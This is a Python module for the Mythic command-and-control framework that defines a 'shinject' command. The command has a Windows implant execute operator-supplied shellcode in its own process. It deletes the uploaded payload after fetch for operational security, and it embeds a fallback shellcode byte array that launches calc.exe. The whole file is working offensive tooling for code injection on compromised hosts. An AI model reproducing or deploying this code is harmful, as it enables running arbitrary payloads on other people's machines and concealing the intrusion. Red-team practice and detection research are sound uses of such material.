from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import base64
import json


class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="shellcode",
                cli_name="Shellcode",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="Shellcode file to execute (if empty, fallback calc.exe shellcode will be used)",
                parameter_group_info=[ParameterGroupInfo(required=True, group_name="Default")],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments provided.")
        if self.command_line[0] != "{":
            raise Exception("Expected JSON input, e.g. {'shellcode': <file_id>}")
        self.load_args_from_json_string(self.command_line)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject (modal popup)"
    description = "Execute shellcode in the current process using a separate thread."
    version = 2
    author = "OFSTeam"
    argument_class = ShinjectArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        try:
            file_id = task.args.get_arg("shellcode")

            # Use Mythic RPC to get file info
            from mythic_container.MythicGoRPC import (
                SendMythicRPCFileSearch,
                MythicRPCFileSearchMessage,
            )

            file_resp = await SendMythicRPCFileSearch(
                MythicRPCFileSearchMessage(TaskID=task.id, AgentFileId=file_id)
            )

            if file_resp and file_resp.Success and len(file_resp.Files) > 0:
                f = file_resp.Files[0]

                # ✅ FIXED: use lowercase attributes (modern Mythic)
                filename = getattr(f, "filename", "shellcode.bin")
                size = getattr(f, "size", 0)
                agent_file_id = getattr(f, "agent_file_id", file_id)

                # Prepare agent arguments
                task.args.add_arg("shellcode-file-id", agent_file_id)
                task.args.remove_arg("shellcode")

                # Mark file to delete after fetch for OPSEC
                await MythicRPC().execute(
                    "update_file",
                    file_id=agent_file_id,
                    task_id=task.id,
                    delete_after_fetch=True,
                    comment="Shellcode prepared for injection",
                )

                task.display_params = f"Executing {filename} ({size} bytes) in current process"
            else:
                # Fallback calc.exe shellcode
                calc_shellcode = bytes([
                    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                    0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                    0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                    0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                    0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                    0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                    0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                    0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                    0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                    0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                    0x6f,0x87,0xff,0xd5,0xbb,0xfe,0x0e,0x32,0xea,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                    0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00
                ])
                fallback_b64 = base64.b64encode(calc_shellcode).decode()
                task.args.add_arg("shellcode-base64", fallback_b64)
                task.args.remove_arg("shellcode")
                task.display_params = "Executing fallback calc.exe shellcode"

        except Exception as e:
            raise Exception(f"Failed preparing shellcode: {str(e)}")

        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        try:
            response_text = response if isinstance(response, str) else json.dumps(response)
            await MythicRPC().execute(
                "create_response",
                task_id=task.Task.ID,
                response=response_text.encode(),
            )
        except Exception as e:
            resp.Success = False
            resp.Error = str(e)
        return resp
